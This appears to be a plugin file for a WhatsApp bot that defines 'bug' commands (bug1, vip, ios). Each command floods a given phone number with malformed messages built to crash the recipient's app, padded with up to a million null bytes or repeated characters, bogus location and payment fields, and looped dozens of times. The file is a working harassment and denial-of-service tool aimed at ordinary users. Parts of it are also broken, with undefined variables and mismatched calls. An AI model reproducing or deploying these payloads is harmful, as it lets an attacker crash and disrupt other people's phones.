











const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    delay,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    downloadContentFromMessage,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    makeInMemoryStore,
    proto
} = require('@whiskeysockets/baileys')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, fetchJson} = require('../lib/functions')

const config = require('../config')
const {
  cmd,
  commands
} = require('../command')
const fetch = require('node-fetch')
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const bugres = '𝙋𝙧𝙤𝙘𝙘𝙚𝙨 👾'
const { beta1, beta2, buk1 } = require("../lib/bug")









const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }

async (conn, mek, m, { reply, from, q, l, prefix }) => {

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": config.LOGO
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"Arafi ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `ShanOfc`
}
}
}
}

async function ngeloc(conn, target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `SHAN BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(conn, jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    conn.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function pirgam(conn, target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝐒𝐇𝐀𝐍 𝐂𝐇𝐑𝐀𝐒𝐇",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/52fbfcc0fd22e01c0ab3f.jpg" } }, { upload: conn.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #DarkShan"
      },
      nativeFlowMessage: {
        messageParamsJson: "".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function sendListMessage(conn, jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "DARK SHAN" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await conn.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(conn, jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "𝐃𝐀𝐑𝐊 𝐒𝐇𝐀𝐍 𝐌𝐃"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'SHAN BUG WHATSAPP', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await conn.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}        
async function sendLiveLocationMessage(conn, jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½'+"ꦾ".repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await conn.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}



async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(conn, jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(conn, jid);
    await sleep(1500)
    sendSystemCrashMessage(conn, jid);
    await sleep(2000)
    sendSystemCrashMessage(conn, jid);
    await sleep(500);
    sendSystemCrashMessage(conn, jid);
    await sleep(500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `DarkShan`
}
}
}

async function iponcrash(conn, target) {
await conn.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await conn.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await conn.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›ArafiBotz"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'ArafiBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": "".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await conn.relayMessage(jid, etc.message, { messageId: etc.key.id })
}
// Updated sendQP function
async function sendQP(conn, target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await conn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
async function sendBugIos(jid) {
iponcrash(jid)
sleep(500)
sendExtendedTextMessage(jid)
}


// Updated sendSessionStructure function
async function sendSessionStructure(conn, target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await conn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}

// Updated command
cmd({
  pattern: "bug1",
  category: "bugs",
  react: "🖕",
  desc: "chat-gpt 3.5V",
  filename: __filename
},
  async (conn, mek, m, { reply, from, q, isPreUser, isMe, l, prefix }) => {
    try {
 if ( !isMe ) return reply('⚠️ ⚠️ *Contact owner to Active your number To Premium user*')
        
      if (!q) return reply(`Example: ${prefix}ponnya 94×××`);
      const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
      reply(bugres);

      for (let i = 0; i < 50; i++) {
        await sendVariousMessages(conn, target, "wanted");
        await sendQP(conn, target, "wanted");
        await beta2(conn, target, "wanted");
        await sendSessionStructure(conn, target, "wanted");
        await beta1(conn, target, "wanted");
      }

      reply(`『 ATTACKING SUCCESS 』

TARGET: ${target}
STATUS: Successfully ♻️`);

    } catch (e) {
      console.error(e);
      reply("ERROR");
    }
  }
);

cmd({
  pattern: "vip",
  category: "bugs",
  react: "👑",
  desc: "chat-gpt 3.5V",
  filename: __filename
},
  async (conn, mek, m, { reply, from, q, isMe,  l, prefix }) => {
    try {

    
 if ( !isisMe ) return reply('⚠️ ⚠️ *Contact owner to Active your number To Premium user*')
        
      if (!q) return reply(`Example: ${prefix}vip 94×××`);
      // Ensure target is a string and formatted correctly
      const target = `${q.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
      reply(bugres);

      for (let i = 0; i < 30; i++) {
        await buk1(conn, target, "p", 1020000, true);
        await sendQP(conn, target, "wanted");  // Ensure conn is passed
        await beta2(conn, target, "wanted");
        await sendSessionStructure(conn, target, "wanted");  // Ensure conn is passed
        await beta1(conn, target, "wanted");
      }

      reply(`『 ATTACKING SUCCESS 』

TARGET: ${target}
STATUS: Successfully ♻️`);

    } catch (e) {
      console.error(e);
      reply("ERROR");
    }
  }
);

cmd({
  pattern: "ios",
  category: "bugs",
  react: "👾",
  desc: "chat-gpt 3.5V",
  filename: __filename
},
  async (conn, mek, m, { reply, from, q, isPreUser, isMe, l, prefix }) => {
    try {

  if ( !isisMe ) return reply('⚠️ ⚠️ *Contact owner to Active your number To Premium user*')
        
      if (!q) return reply(`Example: ${prefix}ios 94×××`);

        
      // Ensure target is a string and formatted correctly
      const target = `${q.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
      reply(bugres);

      for (let i = 0; i < 30; i++) {
        await buk1(conn, target, "p", 1020000, true);
        await sendQP(conn, target, "wanted");  // Ensure conn is passed
        await beta2(conn, target, "wanted");
        await sendSessionStructure(conn, target, "wanted");  // Ensure conn is passed
        await beta1(conn, target, "wanted");
      }

      reply(`『 ATTACKING SUCCESS 』

TARGET: ${target}
STATUS: Successfully ♻️`);

    } catch (e) {
      console.error(e);
      reply("ERROR");
    }
  }
);
